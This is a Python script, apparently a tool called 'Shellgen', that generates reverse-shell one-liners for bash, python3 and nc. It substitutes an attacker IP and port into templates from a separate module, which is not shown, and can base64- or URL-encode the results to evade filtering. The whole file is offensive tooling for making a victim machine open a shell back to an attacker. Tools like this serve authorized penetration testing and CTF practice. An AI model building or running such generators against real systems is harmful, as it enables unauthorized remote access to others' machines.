#!/usr/bin/python3

import sys,argparse,base64
from methods import methods
from urllib.parse import quote as tourl

asciiart = """
 (`-').->  (`-').->  (`-')  _                                 (`-')  _ <-. (`-')_ 
 ( OO)_    (OO )__   ( OO).-/    <-.       <-.        .->     ( OO).-/    \( OO) )
(_)--\_)  ,--. ,'-' (,------.  ,--. )    ,--. )    ,---(`-') (,------. ,--./ ,--/ 
/    _ /  |  | |  |  |  .---'  |  (`-')  |  (`-') '  .-(OO )  |  .---' |   \ |  | 
\_..`--.  |  `-'  | (|  '--.   |  |OO )  |  |OO ) |  | .-, \ (|  '--.  |  . '|  |)
.-._)   \ |  .-.  |  |  .--'  (|  '__ | (|  '__ | |  | '.(_/  |  .--'  |  |\    | 
\       / |  | |  |  |  `---.  |     |'  |     |' |  '-'  |   |  `---. |  | \   | 
 `-----'  `--' `--'  `------'  `-----'   `-----'   `-----'    `------' `--'  `--'

"""
print(asciiart)
parser = argparse.ArgumentParser()
parser.add_argument('-i', metavar='<attacker ip>', help='Attacker ip address to receive the connection back from victim machine. Default = 127.0.0.1',default='127.0.0.1')
parser.add_argument('-p', metavar='<attacker port>', help='Attacker port to listen on. Default = 1337', default='1337')
parser.add_argument('-m', metavar='method to use', default='bash,python3,nc', help='A comma seperated list of reverse shell methods. Default is bash,python3,nc ')
parser.add_argument('-l', action='store_true', help='List available methods for reverse shells')
parser.add_argument('-b', action='store_true', help='Base64 encode the reverse shell output')
parser.add_argument('-u', action='store_true', help='Url encode the reverse shell output')
args = parser.parse_args()


if args.l:
  for key in methods.keys():
    print(f"{key}")
  sys.exit(0)

port = args.p
ip = args.i
method_list = args.m.split(",")

output = ''

for method in method_list:
  if methods.get(method):
    print(f'{method}: ')
    for each in methods.get(method):
      output = f'{each.replace("<ip>",ip).replace("<port>", port)}'
      if args.b:
        output = bytes(output, 'utf-8')
        output = base64.b64encode(output).decode('utf-8')
        print(f'   {output} \n')
      elif args.u:
        output = tourl(output)
        print(f'   {output} \n')
      else:
        print(f'   {output} \n')
